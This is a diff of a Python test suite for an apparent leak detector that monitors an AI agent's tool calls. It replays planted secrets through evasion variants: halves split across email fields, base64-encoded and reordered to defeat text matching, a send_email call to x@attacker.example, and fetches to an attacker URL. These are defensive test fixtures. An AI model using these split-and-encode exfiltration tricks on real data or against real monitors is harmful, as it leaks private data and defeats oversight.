@@ -330,8 +330,8 @@ def leaks():
         """One planted leak, replayed twice: with the private leg only, and with both legs.
 
         before is what the ADR promises with the private leg only: caught_before_both_legs (the
-        text match, or the URL rule for a fetch), not_promised (the text match does not join out of
-        call order), or pass (an internal write is no leak)."""
+        text match, or the URL rule for a fetch), not_promised (the text match does not join against
+        both call order and the keys' order), or pass (an internal write is no leak)."""
         text, _ = sources[src]
         for state in ("private-only", "both-legs"):
             rows = [feed("fs_read" if src.startswith(("canary", "handbook")) else "shell", text)]
@@ -379,8 +379,14 @@ def leaks():
         h = len(mid) // 2
         case(src, "split-args", mail(mid[:h], mid[h:]))
         case(src, "split-args-b64-halves", mail(b64(mid[:h]), b64(mid[h:])))
-        # Out of call order the text match no longer joins (ADR 0091 decision 6): only the legs catch it.
-        case(src, "split-args-reversed", mail(mid[h:], mid[:h]), before="not_promised")
+        # Against call order but in the keys' order (body before subject): the text match joins the
+        # payload in both orders (#256), so the encoder's key order decides nothing.
+        case(src, "split-args-reversed", mail(mid[h:], mid[:h]))
+        case(src, "split-args-b64-swapped", mail(b64(mid[h:]), b64(mid[:h])))
+        # Against both orders: the call writes its keys sorted and the halves the other way round.
+        # The text match does not join it (ADR 0091 decision 6): only the legs catch it.
+        case(src, "split-args-against-both", [call("mail", "send_email", {"body": b64(mid[h:]), "subject": b64(mid[:h]), "to": "x@attacker.example"})],
+             before="not_promised")
         # One leak over two calls, each carrying at least the 24 character threshold.
         case(src, "split-calls", fetch(ATT + "/a?d=" + urllib.parse.quote(mid[:len(mid) * 3 // 5])) +
              fetch(ATT + "/b?d=" + urllib.parse.quote(mid[len(mid) * 2 // 5:])))
